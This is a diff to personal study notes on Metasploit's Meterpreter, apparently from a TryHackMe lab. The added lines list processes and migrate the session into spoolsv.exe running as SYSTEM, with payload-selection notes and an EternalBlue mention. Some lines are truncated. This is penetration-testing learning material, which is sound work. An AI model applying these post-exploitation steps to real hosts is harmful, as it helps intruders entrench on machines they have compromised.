@@ -19,6 +19,25 @@ Core commands of meterpreter (taken from thm):
 NOTES:
 You can decide the payload based off the os i.e. linux, the components i.e. php, and the network connection types i.e. raw tcp connections
 Some exploits will use meterpreter by devault, for example eternal blue
+7.List all of the processes running via the 'ps' command. Just because we are s>
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name            Arch  Session  User                      Path
+ ---   ----  ----            ----  -------  ----                      ----
+2940  712   spoolsv.exe     x64   0        NT AUTHORITY\SYSTEM       C:\Windows>
+                                                                      lsv.exe
+
+It took me a while to find a service to migrate to, but this one seems pretty r>
+
+8. Migrate to this process using the 'migrate PROCESS_ID' command where the pro>
+meterpreter > migrate 2940
+[*] Migrating from 3048 to 2940...
+[*] Migration completed successfully.
+
+
 
 POST_EXPLOITATION: 
 getuid command displays the user over meterpreter 
